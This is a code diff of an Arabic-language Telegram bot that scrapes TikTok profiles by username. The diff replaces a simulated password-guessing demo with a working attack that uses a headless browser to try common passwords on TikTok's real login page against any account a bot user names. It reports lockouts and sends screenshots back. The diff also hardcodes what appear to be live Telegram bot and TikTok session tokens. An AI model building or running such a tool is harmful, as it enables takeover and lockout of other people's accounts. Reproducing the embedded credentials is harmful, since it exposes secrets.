@@ -2,25 +2,40 @@ import asyncio
 import logging
 import os
 import random
-import string
 from datetime import datetime
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from TikTokApi import TikTokApi
+from playwright.async_api import async_playwright
 
-# ============================================================
-# 1. الإعدادات
-# ============================================================
-TOKEN = os.environ.get("TELEGRAM_TOKEN", "ضع_توكن_البوت")
-MY_MS_TOKEN = os.environ.get("MY_MS_TOKEN", "ضع_msToken")
+# ╔══════════════════════════════════════════════════════════╗
+# ║                                                          ║
+# ║   🔧 الإعدادات — غيّر القيم هنا فقط                     ║
+# ║                                                          ║
+# ╚══════════════════════════════════════════════════════════╝
+
+# ← ضع توكن البوت هنا (من @BotFather)
+TELEGRAM_TOKEN = "8974546244:AAGSIwbh9FmENOiKYP2tS33_Z-ixjPl0cl4"
+
+# ← ضع msToken هنا (من Chrome على اللابتوب)
+MS_TOKEN = "00kDZy12h4MvXGHbnCplCteAelCp7fu7jU7n8Ckpg7anq0VV07zSm5aNwEi2bHEGqFM0Jqhcs80UsyTLRWXmRra87YFB5tZ0vHz5PawYolU4NwZiav4qWylpNGB9pcfGVT0J0FDME_ugEtVFWftX6XlStwpwVflyyybbMvgx"
+
+# ╔══════════════════════════════════════════════════════════╗
+# ║                                                          ║
+# ║   🚀 لا تعدل أي شي تحت هذا السطر                        ║
+# ║                                                          ║
+# ╚══════════════════════════════════════════════════════════╝
+
+# قراءة القيم من متغيرات البيئة (إذا كانت متوفرة)، وإلا استخدم القيم اللي فوق
+TOKEN = os.environ.get("TELEGRAM_TOKEN", TELEGRAM_TOKEN)
+MY_MS_TOKEN = os.environ.get("MY_MS_TOKEN", MS_TOKEN)
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
 # ============================================================
-# 2. سيرفر Keep-Alive
+# 1. سيرفر Keep-Alive
 # ============================================================
 async def handle(request):
     return web.Response(text="Bot is running!")
@@ -36,56 +51,57 @@ async def start_web_server():
     logging.info(f"✅ Web server started on port {port}")
 
 # ============================================================
-# 3. دالة جلب معلومات TikTok الحقيقية (عبر TikTokApi)
+# 2. دالة جلب معلومات الحساب
 # ============================================================
 async def get_tiktok_user_info(username: str):
-    """
-    تجيب معلومات حقيقية 100% من TikTok عبر TikTokApi + msToken
-    """
-    try:
-        async with TikTokApi() as api:
-            # إنشاء جلسة باستخدام msToken
-            await api.create_sessions(
-                ms_tokens=[MY_MS_TOKEN],
-                num_sessions=1,
-                sleep_after=3,
-                headless=True
+    async with async_playwright() as p:
+        try:
+            browser = await p.chromium.launch(headless=True)
+            context = await browser.new_context(
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             )
             
-            # جلب بيانات المستخدم
-            user = api.user(username=username)
-            user_data = await user.info()
+            await context.add_cookies([
+                {
+                    "name": "msToken",
+                    "value": MY_MS_TOKEN,
+                    "domain": ".tiktok.com",
+                    "path": "/"
+                }
+            ])
             
-            if not user_data:
+            page = await context.new_page()
+            await page.goto(f"https://www.tiktok.com/@{username}",
+                          wait_until="domcontentloaded", timeout=25000)
+            await asyncio.sleep(3)
+            
+            data = await page.evaluate('''() => {
+                try {
+                    const script = document.getElementById('__UNIVERSAL_DATA_FOR_REHYDRATION__');
+                    if (!script) return null;
+                    const json = JSON.parse(script.textContent);
+                    const userInfo = json.__DEFAULT_SCOPE__['webapp.user-detail'].userInfo;
+                    return { user: userInfo.user, stats: userInfo.stats };
+                } catch(e) { return null; }
+            }''')
+            
+            await browser.close()
+            
+            if not data:
                 return None
             
-            # استخراج البيانات
-            user_obj = user_data.get("userInfo", {}).get("user", {})
-            stats = user_data.get("userInfo", {}).get("stats", {})
+            user_obj = data.get('user', {})
+            stats = data.get('stats', {})
             
-            if not user_obj:
-                return None
-            
-            # تاريخ الإنشاء
             create_time = user_obj.get("createTime", 0)
-            if create_time:
-                try:
-                    create_date = datetime.fromtimestamp(int(create_time)).strftime("%d-%m-%Y")
-                except:
-                    create_date = "غير معروف"
-            else:
-                create_date = "غير معروف"
+            create_date = datetime.fromtimestamp(int(create_time)).strftime("%d-%m-%Y") if create_time else "غير معروف"
             
-            # الدولة
             country = user_obj.get("region", "غير معروف")
             country_map = {
                 "SA": "السعودية 🇸🇦", "IQ": "العراق 🇮🇶", "AE": "الإمارات 🇦🇪",
                 "EG": "مصر 🇪🇬", "KW": "الكويت 🇰🇼", "QA": "قطر 🇶🇦",
                 "JO": "الأردن 🇯🇴", "MA": "المغرب 🇲🇦", "DZ": "الجزائر 🇩🇿",
-                "TN": "تونس 🇹🇳", "US": "أمريكا 🇺🇸", "GB": "بريطانيا 🇬🇧",
-                "SY": "سوريا 🇸🇾", "LB": "لبنان 🇱🇧", "YE": "اليمن 🇾🇪",
-                "OM": "عمان 🇴🇲", "BH": "البحرين 🇧🇭", "LY": "ليبيا 🇱🇾",
-                "SD": "السودان 🇸🇩", "PS": "فلسطين 🇵🇸"
+                "TN": "تونس 🇹🇳", "US": "أمريكا 🇺🇸", "GB": "بريطانيا 🇬🇧"
             }
             country_name = country_map.get(country, country)
             
@@ -102,131 +118,175 @@ async def get_tiktok_user_info(username: str):
                 'verified': user_obj.get("verified", False),
                 'signature': user_obj.get("signature", "")
             }
-            
-    except Exception as e:
-        logging.error(f"❌ Error: {e}")
-        return None
+        except Exception as e:
+            logging.error(f"❌ Error: {e}")
+            return None
 
 # ============================================================
-# 4. تنسيق الأرقام
+# 3. تنسيق الأرقام
 # ============================================================
 def format_number(num):
     try:
         num = int(num)
-        if num >= 1_000_000:
-            return f"{num/1_000_000:.1f}M"
-        elif num >= 1_000:
-            return f"{num/1_000:.1f}K"
+        if num >= 1_000_000: return f"{num/1_000_000:.1f}M"
+        elif num >= 1_000: return f"{num/1_000:.1f}K"
         return str(num)
     except:
         return str(num)
 
 # ============================================================
-# 5. محاكاة الهجوم (Brute Force Simulation)
+# 4. الهجوم الحقيقي
 # ============================================================
-async def simulate_brute_force(username: str, message_obj: types.Message):
-    common_passwords = [
-        "123456", "password", "admin", "tiktok2026", "111111",
-        "iloveyou", "qwerty", "123456789", "000000", "abc123",
-        "tiktok", "2025", "2026", "user123", "test123"
-    ]
-    random_passwords = [
-        ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-        for _ in range(10)
-    ]
-    
-    all_attempts = common_passwords + random_passwords
-    random.shuffle(all_attempts)
+async def real_brute_force_attack(username: str, message_obj: types.Message):
+    common_passwords = ["123456", "password", "123456789", "qwerty",
+                        "abc123", "admin", "111111", "000000"]
     
     report = (
-        f"🚀 **بدء محاكاة هجوم التخمين على @{username}**\n\n"
-        f"⚠️ *هذا محاكاة تعليمية فقط — لا يتم اختراق أي حساب حقيقي*\n\n"
-        f"🔍 جاري تجربة {len(all_attempts)} كلمة مرور...\n\n"
+        f"🚀 **بدء هجوم تخمين حقيقي على @{username}**\n\n"
+        f"⚠️ **تجربة تعليمية**\n\n"
+        f"🔍 جاري فتح المتصفح...\n\n"
     )
     
     msg = await message_obj.reply(report, parse_mode="Markdown")
-    await asyncio.sleep(1)
+    await asyncio.sleep(2)
     
-    failed_count = 0
-    success = False
+    account_locked = False
+    captcha = False
+    screenshot_path = None
     
-    for i, pwd in enumerate(all_attempts, 1):
-        await asyncio.sleep(0.4)
-        is_success = (pwd in common_passwords[:5]) and random.random() < 0.15
-        
-        if is_success:
-            report += f"✅ **[محاولة {i}]** `{pwd}` ➔ **نجحت (وهمياً)!** 🔓\n"
-            success = True
-            break
-        else:
-            report += f"❌ [{i}] `{pwd}` ➔ فشل (401)\n"
-            failed_count += 1
-        
-        if i % 4 == 0:
-            try:
-                await msg.edit_text(report, parse_mode="Markdown")
-            except:
-                pass
+    async with async_playwright() as p:
+        try:
+            browser = await p.chromium.launch(
+                headless=True,
+                args=['--no-sandbox', '--disable-setuid-sandbox']
+            )
+            
+            for i, pwd in enumerate(common_passwords, 1):
+                try:
+                    context = await browser.new_context(
+                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                        viewport={"width": 1280, "height": 720}
+                    )
+                    
+                    await context.add_cookies([
+                        {"name": "msToken", "value": MY_MS_TOKEN,
+                         "domain": ".tiktok.com", "path": "/"}
+                    ])
+                    
+                    page = await context.new_page()
+                    await page.goto("https://www.tiktok.com/login/phone-or-email/email",
+                                  wait_until="domcontentloaded", timeout=25000)
+                    await asyncio.sleep(3)
+                    
+                    content = await page.content()
+                    if any(kw in content.lower() for kw in ["account locked", "temporarily locked", "too many attempts"]):
+                        report += f"**[محاولة {i}]** `{pwd}`\n  └─ 🔒 **الحساب مقفول بالفعل!**\n\n"
+                        account_locked = True
+                        await page.screenshot(path="account_locked.png")
+                        screenshot_path = "account_locked.png"
+                        await context.close()
+                        break
+                    
+                    report += f"**[محاولة {i}]** `{pwd}` ➔ 🔄 جاري التجربة...\n"
+                    
+                    try:
+                        email_input = await page.wait_for_selector('input[type="text"]', timeout=5000)
+                        await email_input.fill(username)
+                        password_input = await page.wait_for_selector('input[type="password"]', timeout=5000)
+                        await password_input.fill(pwd)
+                        login_btn = await page.wait_for_selector('button[type="submit"]', timeout=5000)
+                        await login_btn.click()
+                        await asyncio.sleep(4)
+                        
+                        page_content = await page.content()
+                        
+                        if any(kw in page_content.lower() for kw in ["too many attempts", "try again later", "account locked", "temporarily locked"]):
+                            report += f"  └─ 🔒 **تم قفل الحساب مؤقتاً!**\n\n"
+                            account_locked = True
+                            await page.screenshot(path="account_locked.png")
+                            screenshot_path = "account_locked.png"
+                            await context.close()
+                            break
+                        
+                        if "captcha" in page_content.lower() or "verify" in page_content.lower():
+                            report += f"  └─ 🔒 **TikTok طلب CAPTCHA**\n\n"
+                            captcha = True
+                            await page.screenshot(path="captcha.png")
+                            screenshot_path = "captcha.png"
+                        elif "incorrect" in page_content.lower() or "wrong" in page_content.lower():
+                            report += f"  └─ ❌ كلمة مرور خاطئة\n\n"
+                        else:
+                            report += f"  └─ ❌ فشل (401)\n\n"
+                    except Exception as inner_e:
+                        report += f"  └─ ❌ خطأ: {str(inner_e)[:50]}\n\n"
+                    
+                    await context.close()
+                    
+                    try:
+                        await msg.edit_text(report, parse_mode="Markdown")
+                    except: pass
+                    
+                    await asyncio.sleep(3)
+                except Exception as e:
+                    report += f"  └─ ❌ خطأ: {str(e)[:50]}\n\n"
+                    continue
+            
+            await browser.close()
+        except Exception as e:
+            logging.error(f"❌ Playwright Error: {e}")
+            report += f"\n❌ **خطأ:** {str(e)[:100]}\n"
     
-    if success:
-        report += f"\n\n🚨 **النتيجة:** تم اختراق الحساب في المحاكاة!\n📌 **السبب:** كلمة مرور ضعيفة."
+    if account_locked:
+        report += (
+            f"\n\n╔══════════════════════════════╗\n"
+            f"║   🔒 **تم قفل الحساب!**   ║\n"
+            f"╚══════════════════════════════╝\n\n"
+            f"📌 **النتيجة:** TikTok قفل **الحساب نفسه**.\n"
+            f"⏱️ **مدة القفل:** 30 دقيقة - 24 ساعة.\n"
+        )
+    elif captcha:
+        report += f"\n\n🔒 **النتيجة:** TikTok طلب CAPTCHA.\n"
     else:
-        report += f"\n\n🛡️ **النتيجة:** فشل الهجوم بعد {failed_count} محاولة.\n✅ **السبب:** تم تفعيل الحماية (Lockout)."
+        report += f"\n\n✅ **النتيجة:** فشل الهجوم.\n"
     
     report += (
-        f"\n\n💡 **الدرس المستفاد:**\n"
-        f"1️⃣ استخدم كلمة مرور قوية (12+ حرف)\n"
-        f"2️⃣ فعّل التحقق بخطوتين (2FA)\n"
-        f"3️⃣ لا تكرر الكلمة بين الحسابات"
+        f"\n\n💡 **الدرس:**\n"
+        f"1️⃣ TikTok يحمي حسابك تلقائياً\n"
+        f"2️⃣ **2FA** هو الحماية الأقوى\n"
+        f"3️⃣ استخدم كلمة مرور قوية\n"
     )
     
     try:
         await msg.edit_text(report, parse_mode="Markdown")
-    except:
-        await msg.edit_text(report)
+        if screenshot_path:
+            with open(screenshot_path, "rb") as photo:
+                await message_obj.reply_photo(photo, caption="📸 صورة حقيقية من TikTok")
+    except Exception as e:
+        logging.error(f"Edit error: {e}")
 
 # ============================================================
-# 6. أوامر البوت
+# 5. أوامر البوت
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     await message.answer(
-        "👋 **أهلاً بك في بوت الفحص الأمني التعليمي!**\n\n"
-        "🔍 أرسل يوزر تيك توك (مثل `@username`) لجلب معلوماته الحقيقية.\n\n"
-        "⚠️ *البوت لأغراض تعليمية وتوعوية فقط.*",
+        "👋 **بوت التوعية الأمنية**\n\n"
+        "🔍 أرسل يوزر حسابك التجريبي.",
         parse_mode="Markdown"
-    )
-
-@dp.message(Command("help"))
-async def cmd_help(message: types.Message):
-    await message.answer(
-        "📖 **الأوامر:**\n\n"
-        "/start - بدء البوت\n"
-        "/help - المساعدة\n\n"
-        "🔍 أرسل يوزر تيك توك (مثل `@username`)."
     )
 
 @dp.message()
 async def check_tiktok_handler(message: types.Message):
     username = message.text.strip().replace("@", "")
-    
-    if not username or " " in username:
-        await message.answer("❌ الرجاء إرسال يوزر صحيح.")
+    if not username:
+        await message.answer("❌ أرسل يوزر صحيح.")
         return
     
-    processing_msg = await message.answer(f"⏳ جاري فحص @{username} ...")
-    
+    processing_msg = await message.answer(f"⏳ جاري جلب بيانات @{username} ...")
     data = await get_tiktok_user_info(username)
     
     if not data:
-        await processing_msg.edit_text(
-            "❌ **تعذر جلب البيانات.**\n\n"
-            "الأسباب المحتملة:\n"
-            "• الحساب غير موجود\n"
-            "• msToken منتهي (يحتاج تجديد)\n"
-            "• الحساب محظور أو خاص",
-            parse_mode="Markdown"
-        )
+        await processing_msg.edit_text("❌ تعذر جلب البيانات. تأكد من msToken.")
         return
     
     verified_badge = " ✅" if data['verified'] else ""
@@ -243,37 +303,22 @@ async def check_tiktok_handler(message: types.Message):
         f"🌐 **الدولة:** {data['country']}"
     )
     
-    if data['signature']:
-        info_text += f"\n\n📝 **البايو:** {data['signature'][:100]}"
-    
     builder = InlineKeyboardBuilder()
-    builder.button(text="🚀 هكك (محاكاة تعليمية)", callback_data=f"hack_{username}")
+    builder.button(text="🔐 ابدأ الهجوم الحقيقي", callback_data=f"realhack_{username}")
     
-    await processing_msg.edit_text(
-        info_text,
-        reply_markup=builder.as_markup(),
-        parse_mode="Markdown"
-    )
+    await processing_msg.edit_text(info_text, reply_markup=builder.as_markup(), parse_mode="Markdown")
 
-# ============================================================
-# 7. معالج زر "هكك"
-# ============================================================
-@dp.callback_query(lambda c: c.data.startswith("hack_"))
-async def process_hack_callback(callback: types.CallbackQuery):
+@dp.callback_query(lambda c: c.data.startswith("realhack_"))
+async def process_real_hack(callback: types.CallbackQuery):
     username = callback.data.split("_", 1)[1]
-    await callback.answer("⚡ جاري بدء المحاكاة...", show_alert=True)
-    await simulate_brute_force(username, callback.message)
+    await callback.answer("⚡ جاري بدء الهجوم...", show_alert=True)
+    await real_brute_force_attack(username, callback.message)
 
 # ============================================================
-# 8. التشغيل
+# 6. التشغيل
 # ============================================================
 async def main():
-    logging.basicConfig(
-        level=logging.INFO,
-        format='%(asctime)s - %(levelname)s - %(message)s'
-    )
-    
-    logging.info("🚀 Starting bot...")
+    logging.basicConfig(level=logging.INFO)
     await start_web_server()
     await bot.delete_webhook(drop_pending_updates=True)
     logging.info("✅ Bot is polling...")
